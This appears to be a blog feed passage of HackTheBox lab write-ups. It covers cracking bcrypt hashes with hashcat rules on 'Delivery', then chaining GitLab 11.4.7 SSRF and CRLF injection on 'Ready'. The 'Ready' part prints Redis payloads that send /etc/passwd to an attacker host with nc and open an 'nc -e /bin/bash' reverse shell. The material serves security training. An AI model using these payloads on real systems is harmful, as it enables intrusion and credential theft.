<span style="color:#f92672">|</span> <span style="color:#ae81ff">9</span>ecfb4be145d47fda0724f697f35ffaf <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> aaaa                             <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>yIdqqOXl.<span style="color:#ae81ff">5</span>dcWsXk.Doo2ewl.zTFdsDd2F0.c44iWOpGMIgmDTsY6 <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> iiamf                            <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>esA8d<span style="color:#f92672">/</span>l5.IKQJIhnl2SeYeeoFaCOE6Z<span style="color:#f92672">/</span>esUOSuRb.Vqtkf3gvbli6 <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> iamf                             <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>ZYEM.GLMnAfq8eM.<span style="color:#ae81ff">2</span>rs8q.e<span style="color:#f92672">/</span>q3bHaOVOCvlu7YGhU0rU0Ug4PME9a <span style="color:#f92672">|</span>
<span style="color:#f92672">+----------------------------------+--------------------------------------------------------------+</span>
<span style="color:#ae81ff">12</span> rows <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">000</span> sec)

MariaDB [mattermost]<span style="color:#f92672">&gt;</span>
</code></pre></div><p>Those are bcrypt hashes, but let’s prioritize the root hash.</p>
<h4 id="cracking-the-hash">Cracking the Hash</h4>
<p>Based on the conversations on Mattermost, there is someone in the system that uses a variant of “PleaseSubscribe!” and they were talking about hashcat rules.</p>
<p>I remember exactly that Ippsec (the box author) has shown several techniques on how to generate a variant of seasonal passwords on <a href="https://www.youtube.com/watch?v=H9FcE_FMZio&amp;t=730s">Forest</a> .</p>
<p>Now the idea is instead of generating seasonal passwords, I can try to generate a few variant of &ldquo;PleaseSubscribe!&rdquo; and use them for cracking.</p>
<p>So, I&rsquo;ll start by calculating the length of “PleaseSubscribe!”.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70»
$ echo -n <span style="color:#e6db74">&#39;PleaseSubsribe!&#39;</span> | wc -c
<span style="color:#ae81ff">15</span>
</code></pre></div><p>It has length of 15. I&rsquo;ll save the &ldquo;PleaseSubscribe!&rdquo; string to a file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70»
$ echo <span style="color:#e6db74">&#39;PleaseSubscribe!&#39;</span> &gt; IppsecSubscriber
</code></pre></div><p>Then I’ll feed that file to <code>hashcat</code> to generate some new variant of it using base64 rule, and I&rsquo;ll take out only the string which has a length greater than 15 and pipe the output to a file called <code>custom_wordlist</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
→ root@kali «delivery» «10.10.14.70»
$ hashcat IppsecSubscriber -r /usr/share/hashcat/rules/best64.rule --stdout | awk <span style="color:#e6db74">&#39;length($0) &gt; 15&#39;</span> &gt; custom_wordlist
</code></pre></div><p>It produces 46 words.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70»
$ wc -w custom_wordlist
<span style="color:#ae81ff">46</span> custom_wordlist
</code></pre></div><p>With that wordlist the hash gets cracked instantly!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">C:<span style="color:#ae81ff">\t</span>ools<span style="color:#ae81ff">\h</span>ashcat6&gt;hashcat.exe -m <span style="color:#ae81ff">3200</span> <span style="color:#e6db74">&#39;$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO&#39;</span> custom_wordlist --force

....
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21

Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish <span style="color:#f92672">(</span>Unix<span style="color:#f92672">)</span>
Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
Time.Started.....: Mon Mar <span style="color:#ae81ff">15</span> 21:36:35 <span style="color:#ae81ff">2021</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> sec<span style="color:#f92672">)</span>
Time.Estimated...: Mon Mar <span style="color:#ae81ff">15</span> 21:36:36 <span style="color:#ae81ff">2021</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
....
</code></pre></div><p>The recovered password is <code>PleaseSubscribe!21</code>.</p>
<h4 id="su---root">SU - root</h4>
<p>That password works on root user.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">maildeliverer@Delivery:~$ su root
Password: 
root@Delivery:/home/maildeliverer# id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</code></pre></div><p>Now I can just grab the root flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@Delivery:/home/maildeliverer# cd ~
root@Delivery:~# ls -l
total 16
-rwxr-x--- 1 root root  103 Dec 26 11:26 mail.sh
-r-------- 1 root root  382 Dec 28 07:02 note.txt
-rw-r----- 1 root root 1499 Dec 26 10:55 py-smtp.py
-r-------- 1 root root   33 May 21 11:21 root.txt
root@Delivery:~# cat *.txt
I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I&#39;ve seen several times.  The inspiration for the box is here: 

- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c 

Keep on hacking! And please don&#39;t forget to subscribe to all the security streamers out there.

- ippsec
a7d68baadc3b3c072c6...&lt;SNIP&gt;...
</code></pre></div><p>There is also a message from the <a href="https://www.youtube.com/c/ippsec/videos">box’s author</a>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@Delivery:~# cat note.txt
I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I&#39;ve seen several times. The inspiration for the box is here:

- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c

Keep on hacking! And please don&#39;t forget to subscribe to all the security streamers out there.
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c">https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Ready</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-ready/</link>
      <pubDate>Sat, 15 May 2021 22:00:39 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-ready/</guid>
      <description>Turns SSRF to remote code execution and escape from Docker container</description>
      <content:encoded><![CDATA[<p>Ready is a medium difficulty Linux machine from HackTheBox that features a GitLab instance in a Docker container. By chaining two CVEs, I&rsquo;m able to gain a foothold on the container. Enumerating inside the container discovers a password that can be used on container root account. The container is found to be running in privileged mode, and this can be abused to mount the host file system into the container.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>GitLab 11.4.7 exploitation</li>
<li>Chaining bugs from CVE-2018-19571 and CVE-2018-19585</li>
<li>Docker security</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>BurpSuite - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All ports scan with <code>nmap</code> discovers two open ports: SSH on port 22, and a HTTP web server on port 5080</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «ready» «10.10.14.20» 
$ nmap -p- -sV --reason -oA nmap/10-initial-ready <span style="color:#e6db74">&#39;10.10.10.220&#39;</span>
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-14 04:53 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.220
Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.18s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65533</span> closed ports
Reason: <span style="color:#ae81ff">65533</span> resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
5080/tcp open  http    syn-ack ttl <span style="color:#ae81ff">62</span> nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 503.44 seconds
</code></pre></div><p>After performing a default script scan shows there&rsquo;s a GitLab instance on port 5080.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «ready» «10.10.14.20» 
$ nmap -p22,5080 -sC -sV --reason -oA nmap/10-default-ready 10.10.10.220
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-14 05:17 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.220
Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.090s latency<span style="color:#f92672">)</span>.

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
5080/tcp open  http    syn-ack ttl <span style="color:#ae81ff">62</span> nginx
| http-robots.txt: <span style="color:#ae81ff">53</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in <span style="color:#ae81ff">\x</span>C2<span style="color:#ae81ff">\x</span>B7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.70 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-5080---gitlab">TCP 5080 - GitLab</h3>
<p>The page displays a self-hosted GitLab Community Edition.</p>
<p><div class="img-container"><img src="imgs/image-20210514162031899.png" alt="image-20210514162031899"  /></div>
</p>
<p>I can register with any email domain.</p>
<p><div class="img-container"><img src="imgs/image-20210514162151369.png" alt="image-20210514162151369"  /></div>
</p>
<p>The GitLab version can be seen by visiting<code>/help</code>, and it seems to be an outdated one.</p>
<p><div class="img-container"><img src="imgs/image-20210514162920343.png" alt="image-20210514162920343"  /></div>
</p>
<p>I&rsquo;ll take a note on the version.</p>
<h4 id="user-enumeration-via-gitlab-api">User Enumeration via GitLab API</h4>
<p>I can enumerate the GitLab users via <code>/api/v4/users</code>, but in the end, this was not used.</p>
<p><div class="img-container"><img src="imgs/image-20210514162754664.png" alt="image-20210514162754664"  /></div>
</p>
<p>I&rsquo;ll move and search for vulnerabilities.</p>
<h4 id="searchsploit">Searchsploit</h4>
<p>I can feed the GitLab version to <code>searchsploit</code>, and it returns with two exploits that match with the version.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «~» «10.10.14.20» 
$ searchsploit GitLab 11.4.7    
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
GitLab 11.4.7 - RCE (Authenticated) (2)                                   | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)                 | ruby/webapps/49257.py
-------------------------------------------------------------------------- ---------------------------------
</code></pre></div><p>I relaxed the search keyword to find other potential exploits, and I found an arbitrary file read which previously was used to exploit <a href="/writeup/htb-laboratory">Laboratory</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «exploit» «10.10.14.20»
$ searchsploit GitLab
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
GitLab - &#39;impersonate&#39; Feature Privilege Escalation                       | ruby/webapps/40236.txt
GitLab 11.4.7 - RCE (Authenticated) (2)                                   | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)                 | ruby/webapps/49257.py
GitLab 12.9.0 - Arbitrary File Read                                       | ruby/webapps/48431.txt
Gitlab 12.9.0 - Arbitrary File Read (Authenticated)                       | ruby/webapps/49076.py
Gitlab 6.0 - Persistent Cross-Site Scripting                              | php/webapps/30329.sh
Gitlab-shell - Code Execution (Metasploit)                                | linux/remote/34362.rb
Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting         | java/webapps/47927.txt
NPMJS gitlabhook 0.0.17 - &#39;repository&#39; Remote Command Execution           | json/webapps/47420.txt
-------------------------------------------------------------------------- ---------------------------------
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-git">Shell as git</h3>
<h4 id="gitlab-1147-rce-cve-2018-19571--cve-2018-19585---poc">GitLab 11.4.7 RCE (CVE-2018-19571 &amp; CVE-2018-19585) - PoC</h4>
<p>The RCE exploit that was popped on <code>searchsploit</code> above is consist of two vulnerabilities, SSRF (CVE-2018-19571) and CRLF Injection (CVE-2018-19585). The exploit&rsquo;s author uses the <a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">LifeOverFlow</a>&rsquo;s blog post as reference. So I decided to read that blog and try to reproduce it here.</p>
<p>With SSRF, you can talk with the internal Redis server on port 6379 that used by GitLab as database, cache and message broker. If there is an HTTP request sent to the Redis server using SSRF, the request would read as follows (<code># ==&gt;</code>  is a comment by me)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">GET blablabla HTTP/1.1 # ==&gt; Redis read this as a command 
</span><span style="color:#960050;background-color:#1e0010">Host: [0:0:0:0:0:ffff:127.0.0.1]:6379 
</span><span style="color:#960050;background-color:#1e0010">User-Agent: git/2.18.1  
</span><span style="color:#960050;background-color:#1e0010">Accept: */* 
</span><span style="color:#960050;background-color:#1e0010">Accept-Encoding: deflate, gzip 
</span><span style="color:#960050;background-color:#1e0010">Pragma: no-cache 
</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010">- Err wrong number of arguments for &#39;get&#39; command 
</span></code></pre></div><p>The idea here is to use the CRLF Injection to insert a payload after the &lsquo;GET&rsquo;  line.</p>
<p>For this, I’ll need Burp Suite turned on.</p>
<p>On GitLab, I’ll import a (non-exist) project and choose the &ldquo;Repo by URL&rdquo; menu.</p>
<p><div class="img-container"><img src="imgs/image-20210514171125509.png" alt="image-20210514171125509"  /></div>
</p>
<p>I&rsquo;ll be using the same SSRF payload to bypass the GitLab URL filter which is <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</code> and add my (non-exist) <code>.git</code> repository at the end of the URL, so it becomes <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ssrf-test.git</code></p>
<p><div class="img-container"><img src="imgs/image-20210515000620634.png" alt="image-20210515000620634"  /></div>
</p>
<blockquote>
<p>The repository URL above is a <a href="http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm">special IPv6 address</a> where its last 32 bits is used to embed the IPv4 address. The URL was used to bypass the SSRF protection defined in <code>spec/lib/gitlab/url_blocker_spec.rb</code></p>
</blockquote>
<p>I&rsquo;ll intercept the request after I hit the “Create Project” button, and then on BurpSuite, I’ll modify the import URL to this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"> git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
 multi

 sadd resque:gitlab:queues system_hook_push

 lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;

 exec
 exec
/ssrf-test.git
</code></pre></div><p>So the HTTP request now looks like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /projects <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.10.220:5080</span>
User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.10.220:5080/projects/new</span>
Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">778</span>
Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">sidebar_collapsed=false; _gitlab_session=4426e39af6c1d3d4a4484a8a53f0bac9; event_filter=all</span>
Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>

utf8=%E2%9C%93&amp;authenticity_token=cbS9UXXZDmvTgBUhOTMxF%2FOSii%2FgetcSbM%2FNTT2dG6NllhoQsV8uvbDU65arU9dEOumftKI48ZaDBi6rnJbjOQ%3D%3D&amp;project%5Bimport_url%5D= git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
 multi

 sadd resque:gitlab:queues system_hook_push

 lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;

 exec
 exec
/ssrf-test.git&amp;project%5Bci_cd_only%5D=false&amp;project%5Bname%5D=SSRF+test&amp;project%5Bnamespace_id%5D=5&amp;project%5Bpath%5D=ssrf-test&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0
</code></pre></div><p>After I hit the send button, my <code>nc</code> listener caught the file contents of <code>/etc/passwd</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> root@kali «exploit» «10.10.14.20» 
$ nc -nvlp <span style="color:#ae81ff">9000</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.20<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.220<span style="color:#f92672">]</span> <span style="color:#ae81ff">36612</span>
...&lt;SNIP&gt;...
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
dude:x:1000:1000::/home/dude:/bin/bash
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210515002210570.png" alt="image-20210515002210570"  /></div>
</p>
<h4 id="weaponize---reverse-shell">Weaponize - Reverse Shell</h4>
<p>From here, I’ll reproduce the step above, but this time I’ll send myself a shell. The payload as follows.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text"> git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
 multi

 sadd resque:gitlab:queues system_hook_push

 lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|nc -e /bin/bash 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;

 exec
 exec
/ssrf-to-rce.git
</code></pre></div><p>On my <code>nc</code> listener:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «exploit» «10.10.14.20» 
$ nc -nvlp 9000
listening on [any] 9000 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.220] 37306
id
uid=998(git) gid=998(git) groups=998(git)
hostname
gitlab.example.com
pwd   
/var/opt/gitlab/gitlab-rails/working
</code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
<p>I&rsquo;ll do the &lsquo;stty&rsquo; trick to <a href="https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1">upgrade my shell</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">which python3
/opt/gitlab/embedded/bin/python3
python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
git@gitlab:~/gitlab-rails/working$ ^Z
<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">2354</span> suspended  nc -nvlp <span style="color:#ae81ff">9000</span>
→ root@kali «exploit» «10.10.14.20» 
$ stty raw -echo; fg
<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>  - <span style="color:#ae81ff">2354</span> continued  nc -nvlp <span style="color:#ae81ff">9000</span>

git@gitlab:~/gitlab-rails/working$ 
git@gitlab:~/gitlab-rails/working$ export TERM<span style="color:#f92672">=</span>xterm
</code></pre></div><p>On <code>/home</code>, there is only one user called <code>dude</code>, and I&rsquo;m able to read the user flag there.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:/home/dude$ ls -la
total <span style="color:#ae81ff">24</span>
drwxr-xr-x <span style="color:#ae81ff">2</span> dude dude <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">7</span> 16:58 .
drwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">2</span> 10:45 ..
lrwxrwxrwx <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Dec  <span style="color:#ae81ff">7</span> 16:58 .bash_history -&gt; /dev/null
-rw-r--r-- <span style="color:#ae81ff">1</span> dude dude  <span style="color:#ae81ff">220</span> Aug <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2015</span> .bash_logout
-rw-r--r-- <span style="color:#ae81ff">1</span> dude dude <span style="color:#ae81ff">3771</span> Aug <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2015</span> .bashrc
-rw-r--r-- <span style="color:#ae81ff">1</span> dude dude  <span style="color:#ae81ff">655</span> May <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2017</span> .profile
-r--r----- <span style="color:#ae81ff">1</span> dude git    <span style="color:#ae81ff">33</span> Dec  <span style="color:#ae81ff">2</span> 10:46 user.txt
git@gitlab:/home/dude$ cat user.txt 
e1e30b052b6ec0670698...&lt;SNIP&gt;...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="container-enumeration">Container enumeration</h4>
<p>I found a <code>.dockerenv</code> on the root directory which indicates that I&rsquo;m inside container, and there is also a file called <code>root_pass</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:~$ ls -la /
total <span style="color:#ae81ff">104</span>
drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">1</span> 12:41 .
drwxr-xr-x   <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">1</span> 12:41 ..
-rwxr-xr-x   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">0</span> Dec  <span style="color:#ae81ff">1</span> 12:41 .dockerenv
...&lt;SNIP&gt;...
-rw-r--r--   <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">23</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> root_pass
</code></pre></div><p>The content of <code>root_pass</code> is a random string, which I think it is a password. I tried it to the user and root account but it didn&rsquo;t work.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git@gitlab:/opt/backup$ cat /root_pass 
YG65407Bjqvv9A0a8Tm_7w
</code></pre></div><p>Exploring on <code>/opt</code>, I found a folder called <code>backup</code>. The folder contains three files: <code>docker-compose.yml</code>, <code>gitlab-secrets.json</code> and <code>gitlab.rb</code>.</p>
